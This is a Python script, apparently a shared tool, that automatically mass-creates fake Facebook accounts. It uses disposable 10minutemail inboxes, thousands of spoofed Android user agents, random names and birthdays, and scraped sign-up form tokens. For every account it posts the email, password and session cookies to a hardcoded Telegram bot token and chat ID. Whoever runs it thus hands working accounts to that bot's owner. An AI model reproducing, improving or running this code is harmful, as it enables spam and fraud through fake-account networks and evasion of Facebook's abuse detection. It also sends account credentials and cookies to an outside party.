import os, sys, re, requests, bs4, time, random, json, string
from bs4 import BeautifulSoup
from datetime import datetime

# Telegram bot token and chat ID
telegram_token = "7394517843:AAHhbBzoFiJIgOEI_vcAPGppPVkM6phZI7c"
chat_id = "5772557448"

# Function to send messages to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"Message sent to Telegram: {message}")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")

def convert(cok):
    __for = 'datr=' + cok['datr'] + ';' + ('sb=' + cok['sb']) + ';' + ('fr=' + cok['fr']) + ';' + ('c_user=' + cok['c_user']) + ';' + ('xs=' + cok['xs'])
    return __for

def inbox(session):
    time.sleep(1)
    ses = requests.Session()
    __ = str(time.time()).replace('.', '')[:13]
    data = ses.get(f"https://10minutemail.net/address.api.php?sessionid={session}&_={str(__)}").json()
    if len(data["mail_list"]) != 1:
        address = data["mail_list"][0]["subject"]
        session = address.replace('FB-', '').replace('is your Facebook confirmation code', '')
        return session

ugen = []
for xd in range(5000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['5', '6', '7', '8', '9', '10', '11', '12'])
    if b in ['5', '6', '7', '8', '9']:
        z = random.choice(['0', '1'])
        bv = b + '.' + z + '.' + z
    else:
        bv = b
    B = ['Infinix ']
    c = random.choice(B)
    d = random.choice(list(string.ascii_uppercase))
    e = random.randrange(1, 999)
    f = random.choice(list(string.ascii_uppercase))
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uas = f'{aa} {bv}; {c}{d}{e}{f} Build/{d}{f}; wv) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uas)

logo4 = """AUTO CREATE SIMPLE BY LUXINE"""
boy = ['Ali Khan', 'Rustam Khan', 'Faisal Khan', 'Afzal Khan', 'Haider Khan', 'Suleman Khan', 'Nadeem Khan', 'Nazeer Malik', 'Nazeer Jutt', 'Nazeer Rehmani', 'Safdar Malik', 'Intzar Khan', 'Saleem Malik', 'Abdullah Malik', 'Naseer Jutt', 'Muzammil Malik', 'Fiaz Ahmad', 'Asghar Ali', 'Shabeer Ahmad', 'Irfan Ali', 'Ahmad Gujjar']
girl = ['Sajida Malik', 'Ayesha Khan', 'Nabeela Malik', 'Kinza Fatima', 'Arooj Khan', 'Muskan Khan', 'Ayesha Malik', 'Safina Malik', 'Nida Ali', 'Rimsha Ali']
ok = []
cp = []

def menu():
    create().start()
    os.system('clear')
    print(logo4)
    print('            Auto create tool')
    print(47 * '-')
    print('[1]auto creat')
    print('[2]join Facebook group')
    print('[3] join whatsapp group')
    print(47 * '-')
    sel = input('Select: ')
    if sel in ['1', '01']:
        print("")
    elif sel in ['2', '02']:
        os.system('xdg-open https://www.facebook.com/groups/262660289344669/?ref=share_group_link')
        menu()
    elif sel in ['3', '03']:
        os.system('xdg-open https://chat.whatsapp.com/C4EokyLxEaZGBlyJ99M3pA')
        menu()
    else:
        print('select valid option')
        time.sleep(3)
        menu()

class create:

    def __init__(self):
        self.loop = 0
        self.gender = []

    def start(self):
        os.system('clear')
        print(logo4)
        print('')
        gen = input('[M/F] Gender : ')
        print(47 * '-')
        if gen in ['m', 'M']:
            self.gender.append('boy')
        elif gen in ['f', 'F']:
            self.gender.append('girl')
        else:
            self.gender.append('boy')
        print('Disarankan 2000 Ke atas')
        lim = int(input(' [?] LIMIT PROSES : '))
        os.system('clear')
        print(logo4)
        agent = random.choice(ugen)
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': agent,
            'viewport-width': '980',
        }

        OO = '\033[0;97m'
        for x in range(lim):
            self.loop += 1
            sys.stdout.write(f'\r{OO}[Creat-fb] {OO}{self.loop}/{str(lim)} OK:{len(ok)} - CP:{len(cp)}{OO} ')
            sys.stdout.flush()
            if 'boy' in self.gender:
                name = random.choice(boy).split(' ')
                sex = '2'
            elif 'girl' in self.gender:
                name = random.choice(girl).split(' ')
                sex = '1'

            try:
                ses = requests.Session()
                buildses = user = "".join(random.SystemRandom().choice("qwertyuiopasdfghjklzxcvbnm0987654321") for i in range(26))
                create = ses.get(f"https://10minutemail.net/address.api.php?new=1&sessionid={buildses}&_={int(datetime.now().timestamp() * 1000)}").json()
                mail = {"mail": create["permalink"]["mail"], "session": create["session_id"]}
                email = mail['mail']
                session = mail['session']
            except KeyError:
                pass
            except requests.exceptions.ConnectionError:
                time.sleep(1)
                pass
            except Exception as e:
                pass

            passw = "Mandiri00!"

            try:
                self.ses = requests.Session()
                a = self.ses.get('https://m.facebook.com/reg?_fb_noscript', headers=headers)
                loger = re.search('name="logger_id" value="(.*?)"', str(a.text)).group(1)
                ref = BeautifulSoup(a.text, 'html.parser').find('form', {'action': True, "id": "mobile-reg-form", "method": "post"})
                bl = ['lsd', 'jazoest', 'cpp', 'reg_instance', 'submission_request']
                bz = ['reg_impression_id', 'ns']
                self.data = {}
                for v in ref('input'):
                    if v.get('name') in bl:
                        try:
                            self.data.update({v.get('name'): v.get('value')})
                        except:
                            pass
                self.data.update({'helper': ''})
                for v in ref('input'):
                    if v.get('name') in bz:
                        try:
                            self.data.update({v.get('name'): v.get('value')})
                        except:
                            pass
                self.data.update({
                    "zero_header_af_client": "",
                    "app_id": "103",
                    "logger_id": loger,
                    "field_names[0]": "firstname",
                    "firstname": name[0],
                    "lastname": name[1],
                    "field_names[1]": "birthday_wrapper",
                    "birthday_day": str(random.randint(1, 28)),
                    "birthday_month": str(random.randint(1, 12)),
                    "birthday_year": str(random.randint(1992, 2004)),
                    "age_step_input": "",
                    "did_use_age": "",
                    "field_names[2]": "reg_email__",
                    "reg_email__": email,
                    "field_names[3]": "sex",
                    "sex": sex,
                    "preferred_pronoun": "",
                    "custom_gender": "",
                    "field_names[]": "reg_passwd__",
                    "reg_passwd__": passw,
                    "submit": "Sign Up",
                    "name_suggest_elig": "false",
                    "was_shown_name_suggestions": "false",
                    "did_use_suggested_name": "false",
                    "use_custom_gender": "",
                    "guid": "",
                    "pre_form_step": "",
                })

                gett = self.ses.post('https://m.facebook.com' + ref['action'], headers=headers, data=self.data)
                getts = self.ses.get('https://m.facebook.com/login/save-device/?login_source=account_creation&logger_id=' + loger + '&app_id=103', headers=headers)
                data1 = {}
                cok = self.ses.cookies.get_dict()

                if 'checkpoint' in getts.url:
                    cp.append(email + passw)
                    print(f'\r\033[1;33m[CP] {cok["c_user"]} | {passw}\033[0;97m')
                    # Send CP status to Telegram
                    send_telegram_message(f'[CP] {email} | {passw}')
                else:
                    coki = ";".join([f"{key}={value}" for key, value in self.ses.cookies.get_dict().items()])
                    cok = self.ses.cookies.get_dict()
                    print(f'\r\033[1;32m[OK] {cok["c_user"]} | {passw} | {coki}\033[0;97m')
                    ok.append(email + passw)
                    # Send OK status to Telegram
                    send_telegram_message(f'[OK] {email} | {passw} | {coki}')
            except requests.exceptions.ConnectionError:
                time.sleep(1)
                pass
            except Exception as e:
                pass

        input('back')
        menu()

menu()
